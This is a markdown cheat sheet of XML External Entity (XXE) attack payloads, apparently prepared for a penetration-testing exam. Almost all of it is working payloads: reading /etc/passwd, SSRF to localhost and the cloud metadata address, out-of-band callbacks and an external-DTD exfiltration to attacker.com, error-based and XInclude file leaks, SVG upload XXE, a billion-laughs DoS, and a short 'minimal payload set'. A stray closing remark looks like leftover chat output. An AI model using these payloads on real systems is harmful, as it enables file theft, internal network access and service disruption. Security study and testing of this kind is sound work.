> [!ABSTRACT]  
> XML External Entity (XXE) is a vulnerability that occurs when an application parses **user-controlled XML input** and allows **external entities** to be processed.  
> This lets an attacker make the parser **read local files**, **send requests to internal services (SSRF)**, or **exfiltrate data out-of-band**.  
>  
> It happens when:  
> - XML input is accepted  
> - External entities are enabled  
> - The parser resolves them  
>  
> Impact ranges from **file disclosure → internal network access → full compromise** depending on how the data is used.




---

````md
## 🧠 XML External Entity (XXE) – Payloads

---

### 🎯 1. Basic Detection (Outbound Request)

> [!CHECK]
> Tests if XML parser resolves external entities  
> Look for DNS/HTTP hit on your server  

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com"> ]>
````

---

### 🧪 2. File Read (Classic XXE)

> [!SUCCESS]  
> Reads local files if output is reflected  
> Most reliable exploitation path

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
```

---

### 🧬 3. SSRF via XXE

> [!SUCCESS]  
> Access internal services / cloud metadata  
> Turns XXE into network pivot

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1"> ]>
```

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```

---

### 🧪 4. Blind XXE (Out-of-Band)

> [!CHECK]  
> No output expected  
> Monitor Burp Collaborator / logs

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/xxe"> ]>
```

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
```

---

### 🧩 5. External DTD (Data Exfiltration)

> [!DANGER]  
> Full data exfiltration  
> Used in blind XXE

```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
```

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

---

### 💥 6. Error-Based XXE

> [!SUCCESS]  
> Leaks file content via error messages  
> Useful when reflection is blocked

```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///invalid/%xxe;'>">
%eval;
%err;
]>
```

---

### ⚙️ 7. XInclude Injection (DOCTYPE Bypass)

> [!ATTENTION]  
> Works even when DOCTYPE is disabled  
> Very common bypass

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

### 🧪 8. SVG Upload XXE

> [!SUCCESS]  
> Exploits file upload features  
> SVG is XML → valid attack surface

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg>&xxe;</svg>
```

---

### 💣 9. DoS (Billion Laughs)

> [!DANGER]  
> Crashes XML parser (memory exhaustion)  
> Used to prove impact

```xml
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
]>
<root>&lol2;</root>
```

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
<xi:include parse="text" href="file:///etc/passwd"/>
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - XML parsing disabled
>     
> - DOCTYPE blocked
>     
> - Entity expansion disabled
>     

---

> [!ATTENTION]  
> XXE only works if:
> 
> - XML input exists
>     
> - External entities enabled
>     
> - Parser resolves entities
>     

---

```

---

## 🔥 This is now EXACTLY your system

- Callouts = **meaning / hint**
- Code blocks = **pure payload**
- No broken Obsidian styling
- Clean scan during exams

---


```